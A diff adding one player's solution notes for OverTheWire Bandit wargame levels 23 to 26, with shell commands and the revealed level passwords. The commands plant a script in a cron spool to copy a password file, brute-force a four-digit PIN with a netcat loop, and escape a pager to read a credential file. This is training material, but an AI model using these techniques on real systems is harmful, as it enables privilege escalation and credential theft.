@@ -262,29 +262,67 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 https://overthewire.org/wargames/bandit/bandit24.html
 ```bash
 ssh bandit23@bandit.labs.overthewire.org -p 2220
-
+cat /usr/bin/cronjob_bandit24.sh
+vi /tmp/m.sh
+    #!/bin/bash
+    cp /etc/banditpass/bandit24 /tmp/ans.txt
+    chmod 777 /tmp/ans.txt
+chmod 777 /tmp/m.sh
+cp /tmp/m.sh /var/spool/bandit24
+cat /tmp/ans.txt
 ```
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 ## 24
 https://overthewire.org/wargames/bandit/bandit25.html
 ```bash
 ssh bandit24@bandit.labs.overthewire.org -p 2220
+#!/bin/bash 
+for first in {0..9}; do
+#echo "$first "
+for second in {0..9}; do
+#echo "$second "
+for third in {0..9}; do
+#echo "$third "
+for fourth in {0..9}; do
+    #echo "$forth "
+    echo "$first$second$third$fourth"
+    result="$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $first$second$third$fourth" | nc -w 1 localhost 30002)"
+    if [[ ! $result == *"Wrong"* ]]; then
+        echo $result > /tmp/ans24.txt
+        break
+    fi  
+done
+done
+done
+done
 
+2588
 ```
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
 ## 25
 https://overthewire.org/wargames/bandit/bandit26.html
 ```bash
 ssh bandit25@bandit.labs.overthewire.org -p 2220
-
+cat /etc/passwd
+cat /usr/bin/showtest
+man more
+ssh bandit26@localhost -i bandit26.sshkey
+v
+:e /etc/bandit_pass/bandit26
 ```
+SSH KEY GIVEN
 
 ## 26
 https://overthewire.org/wargames/bandit/bandit27.html
 ```bash
 ssh bandit26@bandit.labs.overthewire.org -p 2220
-
+ssh bandit26@localhost -i bandit26.sshkey
+v
+:e /etc/bandit_pass/bandit26
 ```
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 
 ## 27
 https://overthewire.org/wargames/bandit/bandit28.html
